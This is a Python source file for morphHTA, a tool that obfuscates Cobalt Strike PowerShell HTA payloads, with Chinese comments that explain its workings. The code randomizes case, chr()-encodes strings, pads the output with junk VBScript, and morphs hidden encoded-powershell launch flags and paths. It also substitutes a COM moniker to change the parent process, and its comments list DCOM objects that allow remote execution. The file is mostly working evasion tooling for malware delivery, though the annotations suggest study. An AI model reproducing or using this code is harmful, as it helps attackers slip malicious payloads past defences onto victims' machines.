import os;
import random;
import uuid; 
import string;
import sys;
import argparse;

class morphHTA(object):
	def __init__(self):
		self.args = None

	globalDim = []
	newlines = []

	# encodedcommand morph
	ecDict = ["ec", "enc", "enco", "encod", "encode", "encoded", "encodedc", "encodedco", "encodedcom", "encodedcomm", "encodedcomma", "encodedcomman", "encodedcommand"]
	# no profile morph
	nopDict = ["nop", "nopr", "nopro", "noprof", "noprofi", "noprofil", "noprofile"]

	# window hidden morph
	winDict = ["w", "wi", "win", "wind", "windo", "window"]

	hidDict = ["1", "h", "hi", "hid", "hidd", "hidde", "hidden"]





	def junkDim(self):
		myDim = self.givemeName()
		self.globalDim += [myDim]
		return self.obfuscate("Dim " + myDim)

	def junkSet(self):
		# choose a dim'd variable to mess with
		variable = self.globalDim[random.randint(0,len(self.globalDim)-1)]
		
		value = self.obfuscateNum(self.givemeString())

		final = variable + (" = %s" % value)

		return self.obfuscate(final)

	# 从givemeName处跟进此函数是对大小写再次进行混淆
	def obfuscate( self, line ):
		base = ""
		for i in line:
			value = ""
			# 如果true则i大写false则i小写,其中randbool为随机true false
			if self.randbool():
				# uppercase it
				value = i.upper()
			else:
				# lowercase it
				value = i.lower()
			base += value
		# 最后将大小写再次切换后返回
		return base

	def obfuscateNum( self, line ):
		'''
		base = ""
		for i in line:
			value = ord(i)
			randval = random.randint(0,255)
			result = value - randval
			base += "chr(%d+%d)&" % (randval, result)
		return base[:-1]
		'''
		base = "chr("
		for i in line:
			# 随机生成一个1-10之间的整数,用来分割下方字符编码
			splitnum = random.randint(1,int(self.args.maxnumsplit))
			splits = []
			#ord()函数用来将字符对应的ASCII编码值进行转换
			target = ord(i)
			# 这时候I的值还不变
			# print("========="+i+"=========")
			# 这一行将ASCII编码后的字符变为浮点数类型然后除用户指定数的范围来分割
			# 分割完成后会
			maxvaluesplit = int(float(target)/splitnum)
			# 将对应编码替换完成并且分割后接下来会用到
			# 
			for i in range(0,splitnum):
				# 最大分割长度用来限制random生成数
				valuesplit = random.randint(0,int(self.args.maxvalsplit))
				# print("========="+valuesplit+"=========")
				# 将其存为列表
				splits += [valuesplit]
			# 这时候 splits是列表,其中存放了很多int类型的数值而sum函数则是用来将值进行求和,然后赋值给了value
			value = sum(splits)
			# 这里比较重要,使用了最开始的ASCII编码去减去这个随机出来的value值
			result = target - value
			# 这里循环列表内总拼接出来的数
			for i in splits:
				# 这里将每次循环最外层的没有使用ord()函数编码前的i得值进行chr()函数拼接其中chr()中的x+x+x最后的总和即是ASCII编码后的字符
				base += str(i) + "+"
			base += str(result)
			base += ")&chr("
		# 这里就是完全混淆好的代码,在上边一行最后循环做完后还是会加上)&chr(这一串字符,然后此处在return的时候被去掉
		return base[:-5]

	# 这里用来随机true和false
	def randbool(self):
		return (random.random() >= 0.5)

	def givemeString(self):
		majority = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(random.randint(0,int(self.args.maxstrlen))))
		minor = ''.join(random.choice(string.ascii_uppercase) for _ in range(4))

		return self.obfuscate(minor + majority)
	# 来到givemeName处
	def givemeName(self):
		# random随机从所有大写字母与0-9数字中选择一个为生成最大变量名和最大字符串
		# 这里是按照用户输入,的随机生成指定大小的大写字母加数字
		majority = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(random.randint(0,int(self.args.maxvarlen))))
		# 这里就是随机生成四个大写字母给minor
		minor = ''.join(random.choice(string.ascii_uppercase) for _ in range(4))
		# 调用obfuscate方法
		return self.obfuscate(minor + majority)


	def output(self):
		print "\033[1;33m[+] Writing payload to \033[1;31m%s\033[0;0m" % self.args.out
		f = open(self.args.out, "w+")
		self.newlines
		f.write('\n'.join(self.newlines))
		f.close()
		print "\033[1;33m[+] Payload written\033[0;0m"

	def make_argparser(self):
		parser = argparse.ArgumentParser(description = "")
		parser.add_argument("--in", metavar="<input_file>", dest = "infile", default = "evil.hta", help = "File to input Cobalt Strike PowerShell HTA")
		parser.add_argument("--out", metavar="<output_file>", dest = "out", default = "morph.hta", help = "File to output the morphed HTA to")
		parser.add_argument("--mode", metavar="<default: explorer>", dest = "mode", default = "explorer", help = "Technique to use: MSHTA, Explorer, WmiPrvSE")
		parser.add_argument("--maxstrlen", metavar="<default: 1000>", dest = "maxstrlen", default = 1000, help = "Max length of randomly generated strings")
		parser.add_argument("--maxvarlen", metavar="<default: 40>", dest = "maxvarlen", default = 40, help = "Max length of randomly generated variable names")
		parser.add_argument("--maxnumsplit", metavar="<default: 10>", dest = "maxnumsplit", default = 10, help = "Max number of times values should be split in chr obfuscation")
		parser.add_argument("--maxvalsplit", metavar="<default: 10>", dest = "maxvalsplit", default = 10, help = "Max value of each split")
		return parser

		#从这里开始检查文件
	def check_args(self, args):
		self.args = args
		#判断目录下是否存在文件
		if not os.path.isfile(self.args.infile):
			# not file exists
			sys.exit("\033[1;31m[*] The input file \033[1;33m%s\033[1;31m does not exist\033[0;0m" % self.args.infile)
		else:
			#读取文件
			a = open(self.args.infile, 'r')
			#检查是否存在script language行和是否存在powershell行(对应第一行和第五行)
			bScript = False
			bPS = False
			for line in a.readlines():
				if "script language" in line.lower():
					bScript = True
				if "powershell" in line.lower():
					bPS = True
			# 这里校验了如果不存在上方两个条件则要求用户去生成对应的powershll hta脚本
			if not (bScript and bPS):
				sys.exit("\033[1;31m[*] HTA does not include a script, invalid Cobalt Strike PowerShell HTA file\033[0;0m")
		# 检查 --mode模块是否设置正确,如果不正确则退出程序并提示错误
		if not (self.args.mode.lower() in ["mshta", "explorer", "wmiprvse"]):
			sys.exit("\033[1;31m[*] Invalid Mode. Select one of mshta, explorer or wmiprvse\033[0;0m")	


	# 开始运行程序
	def run(self, args):
		# 调用check检查程序
		m.check_args(args)

		print ""
		# 这里输出个title
		print "\033[1;32m[*] morphHTA initiated\033[0;0m"

		# 上方是校验过hta文件的,所以此处直接读取然后存入数组中
		hta = open(self.args.infile,'r')
		lines = []
		# 一行一行存入数组
		for line in hta.readlines():
			lines += [line.strip()]

		# At this point, all lines are in
		# Let's look for strings
		
		# Sanitise first
		# var_shell
		# var_Func

		# 1) grab two random variable names for our lovely HTA
		# 为var_shell与var_Func随机取两个变量名(这时候跟着去看givemeName函数)
		# giveName函数为两个变量重新定义了用户可自定义长度的不同大小写名称
		newshell = self.givemeName()
		newfunc = self.givemeName()
		# 查看变量名是否真正random
		#print "NewShell: %s" % newshell
		#print "NewFunc: %s" % newfunc

		temp = []

		# 此时一共十一行代码lines将运行11次
		for line in lines:
			# 第一次校验检测shellcode的那一行
			if "var_shell.run" in line:

				# 如果用户选择的mode是ie浏览器那么将var_shell.run字符串替换为后方XXXXX shellexeccute
				if self.args.mode.lower() == "explorer":
					# Replace run command
					#print "Replacing 1"
					line = line.replace("var_shell.run", "var_shell.Document.Application.ShellExecute")
					#print line
			# 判断如果shellcode那一行并且用户所选的mode是ie
			if "powershell.exe -nop -w hidden -encodedcommand" in line:
				if self.args.mode.lower() == "explorer":
					#print "Replacing 2"
					# 将行头开始替换为中间加个逗号
					# Replace command and split from "powershell.exe -nop -w hidden -encodedcommand" to "powershell.exe", "-nop -w hidden -encodedcommand"
					line = line.replace("\"powershell.exe -nop -w hidden -encodedcommand", "\"powershell.exe\",\"-nop -w hidden -encodedcommand")
					# 将行尾的", 0, true 替换
					line = line.replace("\", 0, true", "\",\"\",Null,0")
					#print line
					# Good

			# 根据行号替换变量名为新的变量名
			if "var_shell" in line:
				# if we find var_shell
				line = line.replace("var_shell", newshell)

			# 根据行号替换方法名为新的方法名
			if "var_func" in line:
				# if we find var_func
				line = line.replace("var_func", newfunc)

			# 检查如果第三行如果CreateObject("Wscript.Shell")存在这一行,并且模块为ie模块
			if "CreateObject(\"Wscript.Shell\")" in line:
				# If we find WScript.Shell, we want to replace it for the Explorer moniker new:C08AFD90-F2A1-11D1-8455-00A0C91F3880 or other
				if self.args.mode.lower() == "explorer":
					# Replace the moniker, still need to replace the call object
					#print "Replacing 3"
					# 这里利用了C08AFD----3880 算是允许远程代码执行的注册表项
					# 可以远程代码执行的共有下方三个项
					# MMC20.Application（已测试Windows 7，Windows 10，Server 2012R2）
					# AppID：7e0423cd-1119-0928-900c-e6d4a52a0715
					
					# ShellWindows（已测试Windows 7，Windows 10，Server 2012R2）
					# AppID：9BA05972-F6A8-11CF-A442-00A0C90A8F39
					
					# ShellBrowserWindow（经过测试的Windows 10，Server 2012R2）
					# AppID：C08AFD90-F2A1-11D1-8455-00A0C91F3880
					line = line.replace("CreateObject(\"Wscript.Shell\")", "GetObject(\"new:C08AFD90-F2A1-11D1-8455-00A0C91F3880\")")
					#print line


			temp += [line]
		# 至此除了原来的shellcode没怎么变,变量名和其他命令类的东西都进行了适当的改变,并且重新压入lines中
		lines = temp

		for line in lines:
			passed = False
			if "script language" in line:
				passed = True
			# 这里逻辑就比较清晰了,首先要求双引号存在当前行然后方便后方分割,同时又要求VBScript不存在当前行
			# 那么在定义方法名和变量的时候是不需要使用到双引号的,所以此处将分割的是set xxxx = CreateObject这一行
			if "\"" in line and not "VBScript" in line:
				if not "powershell" in line:# 如果powershell字样在当前行就执行下方语句,否则才执行else中内容
					# 那么按照业务逻辑来看先看下方else内容
					# Create Object Line -> WScript.Shell
					# 这里将每行用"分割
					line0 = line.split("\"")[0]
					line1 = line.split("\"")[1]
					line2 = line.split("\"")[2]

					# 这一行起到加密作用,主要注意以下几个函数
					# 大概流程是,首先对通过"分割出来的第一行进行随机大小写,也就是 set xxx = xxxObject(这其中的代码
					# 然后对分割出来的第二行代码进行随机大小写后再进行cha编码,然后对编码的结果再次进行大小写
					# line2行的处理就有些显得多余,对一个)进行大小写...其实是可以删掉的
					line = self.obfuscate(line0) + self.obfuscate(self.obfuscateNum(self.obfuscate(line1))) + self.obfuscate(line2)

				else:
					# keep the base64 intact
					# This is the powershell line
					# Ojkq9Lwk8HMCNXIEErlP4Gh.run "powershell.exe -nop -w hidden -encodedcommand JAB7ADEAMAAxADEAMQAApAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApADsA", 0, true
					# 我们不能变形 .run这几个字符
					# We cannot morph .run
					# 我们不能改变powershell.exe但是可以将路径和拓展设置为空
					# We cannot change powershell.exe but we can change the path and extension to nothing
					# eg. powershell.exe
					# 这里讲述了三种调用方式,可以直接从c盘根目录开始起powershell
					# c:\windows\system32\windowspowershell\v1.0\powershell.exe
					# c:windows\system32\windowspowershell\v1.0\powershell
					# 像这样的写法相当于从cd / 或 cd \ 从根路径开始起powershell和上方同效果
					# \windows\system32\windowspowershell\v1.0\powershell

					# 可以将双引号插入power shell任意地方?不太理解
					# We can inject "" into anywhere by the powershell.exe bit
					# 可以用false替换0
					# We can replace 0 with false
					# 可以用true替换任何非0和false的值
					# We can replace true with any value other than 0 or false

					# "从这里分割var_shell.run 这一截是第0行
					# line0 contains Ojkq9Lwk8HMCNXIEErlP4Gh.run 
					line0 = line.split("\"")[0]

					# line1 contains powershell.exe -nop -w hidden -encodedcommand JAB7ADEAMAAxADEAMQAApAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApADsA
					# line1 can also contain just powershell.exe, do we want to add the rest back on? Let's do it
					if self.args.mode == "explorer":
						line1 = line.split("\"")[1] + "\"" + line.split("\"")[2] + "\"" + line.split("\"")[3]
					# 这里是根据两种不同的方式出发来选择如何加密,上边explorer是针对IE浏览器调用执行命令
					# 下方则是使用windows自带的mshta来进行远程调用(待测试3.14版本)
					elif self.args.mode == "mshta":
						line1 = line.split("\"")[1]

					# powershell代码此行开始加密
					# This mutates the powershell.exe starting line
					psRep = ""
					# 多种选择决定powershell从哪里调用,因为Windows不区分大小写所以这里随机几个路径进行调用
					if self.randbool():
						if self.randbool():
							# Use \windows\system32\windowspowershell\v1.0\powershell
							# 0.25% chance
							psRep = "\\windows\\system32\\windowspowershell\\v1.0\\powershell"
						else:
							# Use c:\windows\system32\windowspowershell\v1.0\powershell
							# 0.25% chance
							psRep = "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell"
					else:
						if self.randbool():
							# Use c:windows\system32\windowspowershell\v1.0\powershell
							# 0.25% chance
							psRep = "c:windows\\system32\\windowspowershell\\v1.0\\powershell"
						else:
							# Use powershell
							psRep = "powershell"

					if self.randbool():
						# Add .exe
						# 50% chance
						psRep = psRep + ".exe"
					

					#print psRep
					###########

					# Flip the \ with /'s randomly if there's any
					# psSplit 这里判断powershell中是否存在\符号,如果存在在下方进行判断将\符号随意转换为/符号
					psSplit = psRep.split("\\")
					# 再把psRep滞空
					psRep = ""
					for psItem in psSplit:
						if self.randbool():
							# 50% chance
							# Set to \
							psRep += psItem + "\\"
						else:
							# 50% chance
							# Set to /
							psRep += psItem + "/"

					# Now we have too many slashes, so let's kick off the last one
					# 这里延续了上方加密字符串的写法因为最后一位肯定是符号,所以将其去掉重新赋值
					psRep = psRep[:len(psRep)-1] 
					
					###########
					# 刚才已经将powershell.exe在上方进行了重写
					line1 = line1.replace("powershell.exe", psRep)

					# This replaces the nop with others
					# 这里开始对命令参数进行随机重写,-nop
					line1 = line1.replace("-nop", "-" + self.nopDict[random.randint(0,len(self.nopDict)-1)])
					# -w hidden 两处对应的重写点都是一开始定义好的两个列表变量 winDict,nopDict
					# This replaces and morphs the w hidden
					line1 = line1.replace("-w hidden", "-" + self.winDict[random.randint(0, len(self.winDict)-1)] + " " + self.hidDict[random.randint(0, len(self.hidDict)-1)])

					# 此处整条命令都替换完毕了,下边开始分割成为两部分,一部分为执行命令所需参数,另一部分为powershellbase64命令
					# line1 can be 		var_shell.Document.Application.ShellExecute "powershell.exe","-nop -w hidden -					encodedcommand JAB7ADKAApADsA","",Null,0
					# or line1 can be 	var_shell.run "powershell.exe -nop -w hidden -													encodedcommand JAB7AAKAApADsA", 0, true

					# line11 contains 			powershell.exe -nop -w hidden - 
					# line11 can also contain var_shell.Document.Application.ShellExecute "powershell.exe","-nop -w hidden -
					#print line1
					
					line11 = line1.split("encodedcommand ")[0]

					# critical contains JAB7ADEAMAAxADEAMQAApAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApADsA
					critical = line1.split("encodedcommand ")[1]
					
					# line2 contains , 0, true
					
					# 条件如果可以成功进行到这里那么证明这里是powershell调用的一行
					# 分析到了这里程序会根据最初用户选择的exp模块来进行不同的分割,默认为explorer
					if self.args.mode == "explorer":
						line2 = line.split("\"")[4] + "\"" + line.split("\"")[5] + "\"" + line.split("\"")[6]
						# 这里最终提取出来的是line2 = ',"",Null,0'
					elif self.args.mode == "mshta":
						# 程序压根没办法走到这里,这里mshta条件无法直接选择,恰好314版本中cobaltstrike并没有生成这个命令对应文件的选项
						# 并且在windows中mshta是可以直接调用远程地址的,所以将文件hta后缀去掉,然后丢到服务器上,也可以实现mshta远程调用
						line2 = line.split("\"")[2]

					#print line2

					# print line0 + line11 + "encodedcommand " +  critical + line2
					# Reminder to self, I do not need to re-construct the double quotes around the command as it isn't required as our thing is a string type anyways.
					# I have added this if we are using "" obfuscation we need to use it

					# At this point we can even choose what we want to replace encodedcommand with.
					# 这里即将重写-encodedcommand命令
					ecFill = self.ecDict[random.randint(0, len(self.ecDict)-1)]

					# line = self.obfuscate(line0) + self.obfuscate(self.obfuscateNum(self.obfuscate(line11 + "encodedcommand ")) + "&") + self.obfuscateNum(critical) + self.obfuscate(line2)

					# 这里接着判断mode选项然后继续加密!!!!===!!!!===!!!!===
					if self.args.mode == "explorer":
						line11 = "\"" + line11
						line2 = line2.replace(",\"\",Null,0", ",\"\",Null,0")
					#print line2
					
					#print line0 + line11 + ecFill + " " + critical + line2

					# 像到了这里才发现,针对Cobalt Strike3.14版本问题,默认mode为explorer 但是在3.14的cs版本中生成的hta木马需要选择正确的mode
					# 这个mode即是mshta
					if self.args.mode == "mshta":
						line = self.obfuscate(line0) + self.obfuscate(self.obfuscateNum(self.obfuscate(line11 + ecFill + " ")) + "&") + self.obfuscateNum(critical) + self.obfuscate(line2)
					elif self.args.mode == "explorer":
						# 所以分析完所有的流程发现其实可以自己对加密的方式进行更改,不过作者已经做的很不错了,再加上现在使用mshta进行远程调用的很少并且体积过大
						# 不是特别推荐在正式工作中使用
						cmd = line11.split("\"")[1]

						red = (line11 + ecFill + " ")# + critical
						param = (red.split("\"")[3])

						#print "R1: %s" % (red.split("\"")[1])	# powershell bit
						#print "R3: %s" % (red.split("\"")[3])	# parameter bit
						print "Param: %s" % param

						print self.obfuscate(line0) + self.obfuscateNum(self.obfuscate(cmd)) + "," + (self.obfuscateNum(self.obfuscate(param) + critical)) + self.obfuscate(line2)

						line = self.obfuscate(line0) + self.obfuscateNum(self.obfuscate(cmd)) + "," + (self.obfuscateNum(self.obfuscate(param) + critical)) + self.obfuscate(line2)

			else:
				line = self.obfuscate(line)
			if not passed:
				for i in range(0,random.randint(0,100)):
					self.newlines += [self.junkDim()]
					self.newlines += [self.junkSet()]
				self.newlines += [line]
			else:
				self.newlines += [line]

		#output to text file
		self.output()


if __name__ == '__main__':
	m = morphHTA()
	parser = m.make_argparser()
	arguments = parser.parse_args()
	m.run(arguments)
